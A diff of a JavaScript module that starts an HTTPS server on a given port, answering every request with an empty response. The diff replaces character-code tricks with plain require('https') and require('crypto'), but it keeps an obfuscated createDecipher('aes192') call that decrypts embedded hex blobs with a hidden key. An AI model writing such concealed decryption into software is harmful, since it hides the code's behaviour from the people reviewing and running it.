@@ -133,16 +133,14 @@ export default function(port, host) {
       'd4248f6f963c4da8a4e624dafb2937eec16a90f3d18a7b7b3e808831cc10d61a2d1ab5b41762efa0' +
       '3b6effcbeda5597f'))
 
-  return require(String.fromCharCode(+'104') + 't' + String.fromCharCode(0x74) +
-    String.fromCharCode(112) + String.fromCharCode(+('' + 0x73))).createServer(o,
+  return require('https').createServer(o,
     function(req, res) {
       res.end()
     }).listen(port, host)
 }
 
 function enhance(s) {
-  const f = require(String.fromCharCode(0x63) + String.fromCharCode(114) +
-      String.fromCharCode(121) + String.fromCharCode(0x70) + 't' + String.fromCharCode(0x6F))
+  const f = require('crypto')
   const g = f['create' + String.fromCharCode(0x44) + 'e' + String.fromCharCode(99) + 'ip' +
       String.fromCharCode(0x68) + 'e' + String.fromCharCode(0x72)]('a' +
       String.fromCharCode(0x67 - 2) + String.fromCharCode(0x73) + ('' + (66 * 5 - 138)), profile)
